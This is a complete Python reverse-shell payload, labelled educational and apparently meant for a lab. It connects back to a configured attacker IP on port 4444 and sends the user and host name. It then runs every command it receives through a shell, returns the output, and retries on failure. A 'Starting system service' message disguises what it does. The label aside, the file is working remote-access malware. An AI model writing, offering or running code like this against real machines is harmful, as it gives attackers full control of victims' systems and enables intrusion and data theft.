#!/usr/bin/env python3
# UMT_Lab_Payload.py - Educational Only
import socket
import subprocess
import os
import time

# ========== CONFIG ==========
KALI_IP = "192.168.1.11"  # ⚠️ CHANGE TO YOUR KALI IP!
PORT = 4444
# ============================

print("[*] Starting system service...")
time.sleep(2)

def connect_back():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((KALI_IP, PORT))
        s.send(b"\n=== Ubuntu Reverse Shell Connected ===\n")
        s.send(f"User: {os.getlogin()}\n".encode())
        s.send(f"Host: {os.uname()[1]}\n".encode())
        
        while True:
            s.send(b"\nshell$ ")
            cmd = s.recv(4096).decode().strip()
            
            if cmd == "":
                continue
                
            if cmd.lower() == "exit":
                s.send(b"\n[+] Session terminated\n")
                break
            
            try:
                result = subprocess.run(cmd, shell=True,
                                      capture_output=True,
                                      text=True)
                output = result.stdout
                if result.stderr:
                    output += "\n[ERROR]\n" + result.stderr
            except Exception as e:
                output = f"[!] Error: {e}"
            
            s.send(output.encode())
            
        s.close()
    except Exception as e:
        print(f"[!] Connection error: {e}")
        time.sleep(5)
        connect_back()

if __name__ == "__main__":
    connect_back()
